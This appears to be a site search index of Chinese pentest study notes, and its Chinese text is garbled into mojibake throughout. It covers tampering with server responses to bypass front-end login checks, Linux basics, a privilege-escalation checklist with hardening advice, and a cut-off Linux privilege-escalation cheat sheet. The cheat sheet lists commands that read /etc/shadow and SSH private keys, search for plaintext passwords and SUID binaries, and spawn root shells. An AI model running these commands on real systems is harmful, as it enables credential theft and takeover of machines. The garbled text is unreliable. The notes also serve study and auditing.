å†æ³¨æ„è¿™é‡Œçš„account_stateï¼Œé»˜è®¤æ˜¯0ã€‚ä»¥åŠè¿™ä¸ªis_loginï¼Œé»˜è®¤æ˜¯falseã€‚ä»–ä»¬æ˜¯ä¸æ˜¯å°±ç‰¹åˆ«åƒæˆ‘ä»¬åˆšåˆšåœ¨JSé‡Œåˆ†æå‡ºæ¥çš„o.state.account.permissionå’Œo.state.baseInfo.isLoginï¼Ÿæˆ‘ä»¬æ¨æµ‹è¿™ä¸ªå‰ç«¯å®é™…ä¸Šå°±æ˜¯ä»è¿”å›åŒ…é‡Œæ‹¿åˆ°account_stateå’Œis_loginï¼Œå¹¶åˆ†åˆ«ç»™o.state.account.permissionã€o.state.baseInfo.isLoginèµ‹å€¼çš„ã€‚ å› æ­¤æˆ‘ä»¬å°†å…¶åˆ†åˆ«æ”¹ä¸º3å’Œtrueï¼Œç„¶åæŠŠå¦ä¸€ä¸ªcodeæ”¹ä¸º200ï¼Œå‘åŒ… è¿˜æ˜¯èƒ½çœ‹åˆ°åå°é¡µé¢ã€‚è¿™æ ·è™½ç„¶æ“ä½œèµ·æ¥æ¯”è¾ƒç®€å•å‹å¥½ï¼Œä½†æ˜¯ä¸‡ä¸€ç›®æ ‡å‰ç«¯å¯¹å“åº”ç»“æœçš„åˆ¤æ–­è®¾ç½®çš„æ¯”è¾ƒå¤æ‚ï¼Œé‚£å°±ä¸æ˜¯é‚£ä¹ˆå¥½åŠäº†ï¼Œæ¯”å¦‚æˆ‘å‰ç«¯åˆ¤æ–­permissionä¸ºtest123abcdefæ‰ä¸ºæœ‰æ•ˆï¼Œæˆ‘ä»¬å¸¸è§çš„æ”¹å“åº”åŒ…çš„æ–¹æ³•å°±å¾ˆéš¾æ”¹æˆè¿™æ ·äº†ï¼Œæ‰€ä»¥è¿˜æ˜¯å›åˆ°JSå»åˆ†æè°ƒè¯•æ‰èƒ½åº”å¯¹å¤§éƒ¨åˆ†å¥‡è‘©æƒ…å†µï¼Œè¿˜æ˜¯æ¯”è¾ƒåƒåŸºæœ¬åŠŸçš„ã€‚ jsonä¼ å‚é‡Œå¸¸è§çš„ç±»å‹å…¶å®ä¹Ÿå°±æ˜¯ä¸‹å›¾è¿™äº› aä¸ºæ•´å‹ï¼Œbä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œcä¸ºå¸ƒå°”ç±»å‹ï¼Œdä¸ºæ•°ç»„ç±»å‹ï¼Œeä¸ºå¯¹è±¡ç±»å‹ã€‚è¿™å‡ ç§ç±»å‹éƒ½è¯•ä¸€ä¸‹å‡†æ²¡é”™ï¼Œè€Œä¸”å¤§å¤šæ•°æƒ…å†µä¸‹ç±»å‹é”™äº†åç«¯æ˜¯è¦ç›´æ¥æŠ›å‡ºå¼‚å¸¸ä¿¡æ¯çš„ï¼Œä»å¼‚å¸¸ä¿¡æ¯é‡Œå°±å¾ˆå®¹æ˜“èƒ½çœ‹å‡ºæ¥è¿™ä¸ªåœ°æ–¹è¦ä¼ å…¥ä»€ä¹ˆç±»å‹ï¼Œæ¯”å¦‚å¼‚å¸¸é‡Œçœ‹åˆ°xxxxx Object xxxxxxï¼Œå°±å¯ä»¥çŒœæµ‹æŸä¸ªå‚æ•°å¯èƒ½è¦ä¼ å…¥å¯¹è±¡ç±»å‹çš„ä¼ å‚ã€‚"},{"title":"ç½‘ç»œ","path":"/wiki/ç¬”è®°/ç½‘ç»œ.html","content":"lanâ€“wanNAT â€“switchâ€“route lan å±€åŸŸç½‘ï¼Œswitch æ˜¯æŒ‰macåœ°å€åŒºåˆ†ï¼Œä¸€æ—¦ç»è¿‡è·¯ç”±å™¨ï¼Œå°±ä¼šå˜æˆipdnsæŸ¥çœ‹ä¸Šä¸€æ¡ä¿¡æ¯æ˜¯å¦æˆåŠŸ echo $?"},{"title":"linuxå­¦ä¹ ","path":"/wiki/ç¬”è®°/linuxå­¦ä¹ .html","content":"stdin stdout stderrå¯¹åº”æ–‡ä»¶æ ‡è¯†ç¬¦ï¼š0 1 2 å¦‚æœæˆ‘ä»¬æƒ³å°† STDOUT å’Œ STDERR é‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨font style=color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);/fontã€‚è¿™ä¸ªâ€œâ€ä»£è¡¨ FD 1 å’Œ FD 2 è¡¨ç¤º 1å’Œ2 é‡å®šå‘ è¿½åŠ  è¦†ç›– | ç®¡é“ç¬¦ rm -r r é€’å½’åˆ›å»ºæ–‡ä»¶ touchuniq å»é™¤ç›¸é‚»é‡å¤è¡Œ æƒ³è¦å»é™¤æ•´ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥å…ˆsortï¼Œç„¶åå»é™¤ cat animals | tee unsorted.txt | sort | uniq sorted.txt teeçš„ä½œç”¨æ˜¯å°†å¦ä¸€ä¸ªå‘½ä»¤è¾“å‡ºçš„ STDIN ä¼ é€’è¿‡å»ï¼ŒåŒæ—¶å°†å‰¯æœ¬å†™å…¥æ–‡ä»¶ ç”¨æˆ·æƒé™ uid(ç”¨æˆ·æ ‡è¯†ç¬¦) root 0 æ™®é€š 1-501 useradd -u æŒ‡å®šuid -d æŒ‡å®šç›®å½• passwd -d æ¸…ç©ºå¯†ç  -l é”å®šè´¦æˆ· -u è§£é” -S æ˜¯å¦é”å®š usermod -l æ›´æ”¹åå­— -L é”å®š -U è§£é” userdel -r æ–‡ä»¶æƒé™orç›®å½•æƒé™ r w x chmod -Ré€’å½’ä¿®æ”¹æƒé™ umask è®¾å®šæ–‡ä»¶åˆå§‹æƒé™ chown å±ä¸» æ–‡ä»¶æˆ–ç›®å½• setä½ s ç²˜æ»ä½ t å…±äº«æ–‡ä»¶ç”¨ chattr i å…¨é” a ä¿®æ”¹é” +ï¼Œ-ï¼Œç”¨æ³•ç›¸åŒ ç½‘ç»œroute route add -net æˆ‘è¦å»å“ª gw ä¸‹ä¸€è·³åœ°å€ route add default gw ç½‘å…³ ä¿®æ”¹ç½‘ç»œ vim etcsysconfignetwork-scriptsifcfg-xxx BOOTPROTOdhcp -static onbootyes ipaddr netmask gateway dns1 dns2 æŸ¥çœ‹dns cat etcresolv.conf"},{"title":"Lin_ä¿¡æ¯æ”¶é›†","path":"/wiki/å†…ç½‘/ææƒ/Lin_ä¿¡æ¯æ”¶é›†.html","content":"é¡¹ç›®ï¼ˆItemï¼‰ å‘½ä»¤æ£€æŸ¥é¡¹ï¼ˆCommandCheckï¼‰ ç›®çš„ï¼ˆPurposeï¼‰ æ³¨æ„äº‹é¡¹ï¼ˆNotesï¼‰ é£é™©ç­‰çº§ï¼ˆLowHighï¼‰ è¡ŒåŠ¨å»ºè®®ï¼ˆæ¦‚å¿µçº§ï¼‰ ç³»ç»Ÿä¸å†…æ ¸ï¼ˆSystem Kernelï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);uname -a/font ç¡®å®š OS å‘è¡Œç‰ˆã€è¿è¡Œå†…æ ¸ç‰ˆæœ¬ vs å·²å®‰è£…å†…æ ¸ç‰ˆæœ¬ï¼ˆæ£€æµ‹å†…æ ¸æ¼æ´å¯èƒ½æ€§ï¼‰ å…³æ³¨å†…æ ¸ç‰ˆæœ¬æ˜¯å¦å­˜åœ¨å·²çŸ¥ææƒæ¼æ´ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);CVE-2021-4034/font å¯¹åº”å†…æ ¸ç‰ˆæœ¬èŒƒå›´ï¼‰ High å¯¹æ¯” font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);exploit-db/font æ’æŸ¥æ˜¯å¦å­˜åœ¨åŒ¹é…å†…æ ¸æ¼æ´ï¼›ä¼˜å…ˆæ›´æ–°å†…æ ¸ å½“å‰èº«ä»½ä¸ç™»å½•ï¼ˆCurrent Identity Loginsï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);id/fontï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);last/font å®šä½ç”¨æˆ·è´¦æˆ·ã€æœ€è¿‘ç™»å½•è®°å½•ï¼Œè¯†åˆ«æ½œåœ¨é—²ç½®è´¦æˆ·æˆ–ç‰¹æƒè´¦æˆ·ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);uid=0/font çš„ rootï¼‰ æ£€æŸ¥æ˜¯å¦å­˜åœ¨ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo/font æƒé™ç”¨æˆ·æˆ– font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);wheel/font ç»„æˆå‘˜ High å®¡è®¡éæ´»è·ƒè´¦æˆ·ï¼Œé™åˆ¶ç‰¹æƒç”¨æˆ·ç™»å½•æ¥æº SUIDSGID æ–‡ä»¶ï¼ˆSUIDSGID Filesï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);find / -perm -4000 2/dev/null/fontï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);find / -perm -2000 2/dev/null/font æŸ¥æ‰¾å…·æœ‰ SUIDSGID æƒé™çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå¯èƒ½è¢«æ»¥ç”¨ææƒï¼‰ ç»“åˆ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);GTFOBins/font æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨å·²çŸ¥æ»¥ç”¨æ–¹æ³•ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);find/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);nmap/font ç­‰ï¼‰ High ç§»é™¤ä¸å¿…è¦çš„ SUIDSGID æƒé™ï¼Œä½¿ç”¨ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);chmod u-s/font Capabilities æƒé™ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);getcap -r / 2/dev/null/font æŸ¥æ‰¾å…·æœ‰ POSIX Capabilities çš„æ–‡ä»¶ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);CAP_SYS_ADMIN/font å¯èƒ½å¯¼è‡´ææƒï¼‰ å…³æ³¨ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);cap_setuid+ep/font ç­‰é«˜é£é™©æƒé™ï¼Œä¾‹å¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);python3 = cap_setuid+ep/font High ä½¿ç”¨ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);setcap -r æ–‡ä»¶/font ç§»é™¤å±é™© Capabilities è¿›ç¨‹ä¿¡æ¯ï¼ˆProcessesï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);ps -eo pid,user,cmd,exe/font è¯†åˆ«ç‰¹æƒè¿›ç¨‹ï¼ˆå¦‚ root è¿è¡Œçš„æœåŠ¡ï¼‰åŠå¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ æ£€æŸ¥è¿›ç¨‹æ˜¯å¦å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´æˆ–å¯å†™çš„å¯æ‰§è¡Œæ–‡ä»¶ Medium é™åˆ¶è¿›ç¨‹æƒé™ï¼Œä½¿ç”¨ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);chroot/font æˆ–å®¹å™¨éš”ç¦»é«˜å±æœåŠ¡ æ–‡ä»¶ç³»ç»Ÿæƒé™ï¼ˆFilesystemï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);ls -la //fontï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);mount/font æ£€æŸ¥ç²˜æ€§ä½ï¼ˆsticky bitï¼‰ã€font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);noexec/fontfont style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);nosuid/font æŒ‚è½½é€‰é¡¹ã€å¯å†™ç›®å½•ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/tmp/font æƒé™ï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/tmp/font è‹¥ä¸º font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);rwx/font ä¸”æ— ç²˜æ€§ä½ï¼Œå¯èƒ½å­˜åœ¨æ–‡ä»¶è¦†ç›–é£é™©ï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/etc/passwd/font å¯å†™æ€§éœ€é‡ç‚¹å…³æ³¨ High å¯¹ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/tmp/font è®¾ç½® font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sticky bit/fontï¼Œå¯¹ç³»ç»Ÿç›®å½•å¯ç”¨ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);nosuid/font è®¡åˆ’ä»»åŠ¡ï¼ˆCron Scheduled Tasksï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);crontab -l/fontï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);cat /etc/crontab/font æ£€æŸ¥è®¡åˆ’ä»»åŠ¡æ˜¯å¦å­˜åœ¨é«˜é£é™©è„šæœ¬ï¼ˆå¦‚æ‰€æœ‰è€…ä¸º root ä½†å¯è¢«ä½æƒé™ç”¨æˆ·ä¿®æ”¹çš„è„šæœ¬ï¼‰ å…³æ³¨ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);* * * * */font é«˜é¢‘ä»»åŠ¡ï¼ŒåŠ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sh /tmp/script.sh/font ç­‰ä½¿ç”¨ç›¸å¯¹è·¯å¾„çš„å‘½ä»¤ High é™åˆ¶è®¡åˆ’ä»»åŠ¡è„šæœ¬æƒé™ä¸º font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);root:root 600/fontï¼Œé¿å…ä½¿ç”¨ç›¸å¯¹è·¯å¾„ ç¯å¢ƒå˜é‡ï¼ˆEnvironmentï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);echo $PATH/fontï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);env/font æ£€æŸ¥ PATH æ˜¯å¦åŒ…å«å¯å†™ç›®å½•ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/tmp/fontï¼‰ï¼Œå¯èƒ½å¯¼è‡´å‘½ä»¤åŠ«æŒ è‹¥ PATH ä¸­å¯å†™ç›®å½•ä½äºç³»ç»Ÿç›®å½•å‰ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/tmp:/usr/bin/fontï¼‰ï¼Œé£é™©æ›´é«˜ Medium æ¸…ç† PATH ä¸­çš„å¯å†™ç›®å½•ï¼Œä½¿ç”¨ç»å¯¹è·¯å¾„æ‰§è¡Œå‘½ä»¤ Sudo é…ç½®ï¼ˆSudo Privilege Escalationï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo -l/font æŸ¥æ‰¾ sudo é…ç½®é”™è¯¯ï¼ˆå¦‚æ— éœ€å¯†ç çš„å‘½ä»¤ï¼‰åŠå…è®¸æ‰§è¡Œçš„å‘½ä»¤ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo vi/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo find/fontï¼‰ ç»“åˆ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);GTFOBins/font æ£€æŸ¥å…è®¸çš„å‘½ä»¤æ˜¯å¦å­˜åœ¨ææƒæ–¹æ³•ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo vi - :!bash/fontï¼‰ High æœ€å°åŒ– sudo æƒé™ï¼Œç¦æ­¢æ— å¯†ç æ‰§è¡Œæ•æ„Ÿå‘½ä»¤ è®¤è¯æ—¥å¿—ï¼ˆAuth Logsï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);cat /var/log/auth.log 2/dev/null/font å®¡è®¡è®¤è¯äº‹ä»¶ï¼ˆå¦‚å¤±è´¥ç™»å½•ã€sudo ææƒå°è¯•ï¼‰ï¼Œè¯†åˆ«å¯ç–‘ææƒè¡Œä¸º å…³æ³¨ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo: PAM authentication failure/font æˆ– font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);root : TTY=pts/0 ; COMMAND=/bin/bash/font Medium å¯ç”¨æ—¥å¿—å®¡è®¡å·¥å…·ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);auditd/fontï¼‰ï¼Œç›‘æ§æ•æ„Ÿå‘½ä»¤æ‰§è¡Œ å·²å®‰è£…åŒ…ï¼ˆInstalled Packagesï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);dpkg -l/fontï¼ˆDebianï¼‰ï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);rpm -qa/fontï¼ˆRHELï¼‰ åˆ—å‡ºå·²å®‰è£…åŒ…ç‰ˆæœ¬ï¼Œæ’æŸ¥å·²çŸ¥æ¼æ´ç‰ˆæœ¬ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);polkit/font æ¼æ´å¯¹åº”ç‰ˆæœ¬ï¼‰ ç»“åˆ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);CVE Details/font æˆ– font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);nessus/font æ£€æŸ¥åŒ…ç‰ˆæœ¬æ˜¯å¦å­˜åœ¨æœ¬åœ°ææƒæ¼æ´ High"},{"title":"Linuxææƒ","path":"/wiki/å†…ç½‘/ææƒ/Linuxææƒ.html","content":"åŸºç¡€çŸ¥è¯†ä¿¡æ¯æ”¶é›†æ“ä½œç³»ç»Ÿ| plain uname -a # æ‰“å°æ‰€æœ‰å¯ç”¨çš„ç³»ç»Ÿä¿¡æ¯ uname -r # å†…æ ¸ç‰ˆæœ¬ uname -n # ç³»ç»Ÿä¸»æœºåã€‚ uname -m # æŸ¥çœ‹ç³»ç»Ÿå†…æ ¸æ¶æ„ï¼ˆ64ä½/32ä½ï¼‰ uname -mrs # æŸ¥çœ‹ç³»ç»Ÿå†…æ ¸æ¶æ„ï¼ˆ64ä½/32ä½ï¼‰ hostname # ç³»ç»Ÿä¸»æœºå cat /proc/version # å†…æ ¸ä¿¡æ¯ cat /etc/*-release # åˆ†å‘ä¿¡æ¯ cat /etc/issue # åˆ†å‘ä¿¡æ¯ cat /proc/cpuinfo # CPUä¿¡æ¯ cat /etc/lsb-release # Debian based cat /etc/redhat-release # Redhat based ls /boot | grep vmlinuz-\t# å†…æ ¸ç‰ˆæœ¬ || â€” | ç¯å¢ƒå˜é‡ plain env # æ˜¾ç¤ºç¯å¢ƒå˜é‡ set # ç°å®ç¯å¢ƒå˜é‡ echo %PATH # è·¯å¾„ä¿¡æ¯ history # æ˜¾ç¤ºå½“å‰ç”¨æˆ·çš„å†å²å‘½ä»¤è®°å½• pwd # è¾“å‡ºå·¥ä½œç›®å½• cat /etc/profile # æ˜¾ç¤ºé»˜è®¤ç³»ç»Ÿå˜é‡ cat /etc/shells # æ˜¾ç¤ºå¯ç”¨çš„shellrc cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout cat /proc/??/environ # ??è¡¨ç¤ºä¸¤ä¸ªç¬¦å· æ‰“å°æœºæœåŠ¡ plain lpstat -a ç”¨æˆ·å’Œç¾¤ç»„| plain cat /etc/passwd # åˆ—å‡ºç³»ç»Ÿä¸Šçš„æ‰€æœ‰ç”¨æˆ· cat /var/mail/root cat /var/spool/mail/root cat /etc/group # åˆ—å‡ºç³»ç»Ÿä¸Šçš„æ‰€æœ‰ç»„ grep -v -E ^# /etc/passwd | awk -F: $3 == 0 { print $1} # åˆ—å‡ºæ‰€æœ‰çš„è¶…çº§ç”¨æˆ·è´¦æˆ· whoami # æŸ¥çœ‹å½“å‰ç”¨æˆ· w # è°ç›®å‰å·²ç™»å½•ï¼Œä»–ä»¬æ­£åœ¨åšä»€ä¹ˆ last # æœ€åç™»å½•ç”¨æˆ·çš„åˆ—è¡¨ lastlog # æ‰€æœ‰ç”¨æˆ·ä¸Šæ¬¡ç™»å½•çš„ä¿¡æ¯ lastlog â€“u %username% # æœ‰å…³æŒ‡å®šç”¨æˆ·ä¸Šæ¬¡ç™»å½•çš„ä¿¡æ¯ lastlog |grep -v Never # ä»¥å‰ç™»å½•ç”¨æˆ·çš„å®Œæ•´ä¿¡æ¯ || â€” | ç”¨æˆ·æƒé™ä¿¡æ¯ plain whoami å½“å‰ç”¨æˆ·å id å½“å‰ç”¨æˆ·ä¿¡æ¯ cat /etc/sudoers è°è¢«å…è®¸ä»¥rootèº«ä»½æ‰§è¡Œ sudo -l å½“å‰ç”¨æˆ·å¯ä»¥ä»¥rootèº«ä»½æ‰§è¡Œæ“ä½œ è¿›ç¨‹å’ŒæœåŠ¡ plain ps aux ps -ef top cat /etc/services æŸ¥çœ‹ä»¥ root è¿è¡Œçš„è¿›ç¨‹ | plain ps aux | grep root ps -ef | grep root || â€” | æŸ¥çœ‹å®‰è£…çš„è½¯ä»¶ plain ls -alh /usr/bin/ ls -alh /sbin/ ls -alh /var/cache/yum/ dpkg -l æœåŠ¡æ’ä»¶æ£€æŸ¥æœ‰æ²¡æœ‰ä¸å®‰å…¨çš„æœåŠ¡é…ç½®ï¼Œå’Œä¸€äº›æœ‰æ¼æ´çš„æ’ä»¶ã€‚ | plain cat /etc/syslog.conf cat /etc/chttp.conf cat /etc/lighttpd.conf cat /etc/cups/cupsd.conf cat /etc/inetd.conf cat /etc/apache2/apache2.conf cat /etc/my.conf cat /etc/httpd/conf/httpd.conf cat /opt/lampp/etc/httpd.conf ls -aRl /etc/ | awk $1 ~ /^.*r.*/ || â€” | è®¡åˆ’ä»»åŠ¡| plain crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root || â€” | æœ‰æ— æ˜æ–‡å­˜æ”¾ç”¨æˆ·å¯†ç | plain grep -i user [filename] grep -i pass [filename] grep -C 5 password [filename] find , -name *.php -print0 | xargs -0 grep -i -n var $password || â€” | æ¯”å¦‚è¯´å¯èƒ½ä½¿ç”¨é‚®ä»¶æ˜æ–‡ä¼ è¾“å¯†ç ï¼› åˆæˆ–è€…è¯´ MySQL ä¸­æ˜æ–‡å­˜æ”¾ç”¨æˆ·å¯†ç ã€‚ æœ‰æ—  ssh ç§é’¥ plain cat ~/.ssh/authorized_keys cat ~/.ssh/identity.pub cat ~/.ssh/identity cat ~/.ssh/id_rsa.pub cat ~/.ssh/id_rsa cat ~/.ssh/id_dsa.pub cat ~/.ssh/id_dsa cat /etc/ssh/ssh_config cat /etc/ssh/sshd_config cat /etc/ssh/ssh_host_dsa_key.pub cat /etc/ssh/ssh_host_dsa_key cat /etc/ssh/ssh_host_rsa_key.pub cat /etc/ssh/ssh_host_rsa_key cat /etc/ssh/ssh_host_key.pub cat /etc/ssh/ssh_host_key æŸ¥çœ‹ä¸å½“å‰æœºå™¨é€šä¿¡çš„å…¶ä»–ç”¨æˆ·æˆ–è€…ä¸»æœº| plain lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w || â€” | æ—¥å¿—æ–‡ä»¶ plain cat /var/log/boot.log cat /var/log/cron cat /var/log/syslog cat /var/log/wtmp cat /var/run/utmp cat /etc/httpd/logs/access_log cat /etc/httpd/logs/access.log cat /etc/httpd/logs/error_log cat /etc/httpd/logs/error.log cat /var/log/apache2/access_log cat /var/log/apache2/access.log cat /var/log/apache2/error_log cat /var/log/apache2/error.log cat /var/log/apache/access_log cat /var/log/apache/access.log cat /var/log/auth.log cat /var/log/chttp.log cat /var/log/cups/error_log cat /var/log/dpkg.log cat /var/log/faillog cat /var/log/httpd/access_log cat /var/log/httpd/access.log cat /var/log/httpd/error_log cat /var/log/httpd/error.log cat /var/log/lastlog cat /var/log/lighttpd/access.log cat /var/log/lighttpd/error.log cat /var/log/lighttpd/lighttpd.access.log cat /var/log/lighttpd/lighttpd.error.log cat /var/log/messages cat /var/log/secure cat /var/log/syslog cat /var/log/wtmp cat /var/log/xferlog cat /var/log/yum.log cat /var/run/utmp cat /var/webmin/miniserv.log cat /var/www/logs/access_log cat /var/www/logs/access.log ls -alh /var/lib/dhcp3/ ls -alh /var/log/postgresql/ ls -alh /var/log/proftpd/ ls -alh /var/log/samba/ Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp æ•æ„Ÿæ–‡ä»¶ plain cat /etc/passwd cat /etc/group cat /etc/shadow ls -alh /var/mail/ ls -ahlR /root/ ls -ahlR /home/ ç‰¹æ®Šçš„æ•°æ®åº“ã€é…ç½®æ–‡ä»¶ plain cat /var/apache2/config.inc cat /var/lib/mysql/mysql/user.MYD cat /root/anaconda-ks.cfg äº¤äº’å¼shell plain python -c import pty;pty.spawn(/bin/bash) echo os.system(/bin/bash) /bin/sh -i æŸ¥çœ‹å®‰è£…è¿‡çš„å·¥å…· plain find / -name perl* find / -name python* find / -name gcc* ... é€šè®¯ä¸ç½‘ç»œç³»ç»Ÿæœ‰å“ªäº› NICï¼Ÿå®ƒæ˜¯å¦è¿æ¥åˆ°å¦ä¸€ä¸ªç½‘ç»œï¼Ÿ plain /sbin/ifconfig -a cat /etc/network/interfaces cat /etc/sysconfig/network ç½‘ç»œé…ç½®è®¾ç½®æ˜¯ä»€ä¹ˆï¼Ÿä½ èƒ½ä»è¿™ä¸ªç½‘ç»œä¸­æ‰¾åˆ°ä»€ä¹ˆï¼ŸDHCPæœåŠ¡å™¨ï¼ŸåŸŸåæœåŠ¡å™¨ï¼Ÿç½‘å…³ï¼Ÿ plain cat /etc/resolv.conf cat /etc/sysconfig/network cat /etc/networks iptables -L hostname dnsdomainname è¿˜æœ‰å“ªäº›å…¶ä»–ç”¨æˆ·å’Œä¸»æœºæ­£åœ¨ä¸ç³»ç»Ÿé€šä¿¡ï¼Ÿ| plain lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w || â€” | ç¼“å­˜äº†ä»€ä¹ˆï¼ŸIP å’Œæˆ– MAC åœ°å€ plain arp -e route /sbin/route -nee æ•°æ®åŒ…å—…æ¢å¯èƒ½å—ï¼Ÿèƒ½çœ‹åˆ°ä»€ä¹ˆï¼Ÿ plain tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 å¯ææƒSUID GUIDå‚è€ƒèµ„æ–™https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ plain find / -perm -1000 -type d 2/dev/null # Sticky bit find / -perm -g=s -type f 2/dev/null # SGID (chmod 2000) find / -perm -u=s -type f 2/dev/null # SUID (chmod 4000) find / -perm -g=s -o -perm -u=s -type f 2/dev/null # SGID or SUID for i in `locate -r bin$`; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2/dev/null; done # æŸ¥æ‰¾ /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin æˆ–è€…æ˜¯ *bin æ˜¯å¦å­˜åœ¨ SGID or SUID ï¼ˆå¿«é€ŸæœæŸ¥æ–¹å¼ï¼‰ # ä» root (/) å¼€å§‹æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨ SGID or SUID, not Symbolic links, æ–‡ä»¶å¤¹æ·±åº¦ä¸º 3(å¯ä»¥æ›´æ”¹), å¹¶åˆ—å‡ºé”™è¯¯ä¿¡æ¯ (ä¾‹å¦‚ permission denied) find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2/dev/null æŸ¥çœ‹å¯å†™æ‰§è¡Œç›®å½• plain find / -writable -type d 2/dev/null # world-writeable folders find / -perm -222 -type d 2/dev/null # world-writeable folders find / -perm -o w -type d 2/dev/null # world-writeable folders find / -perm -o x -type d 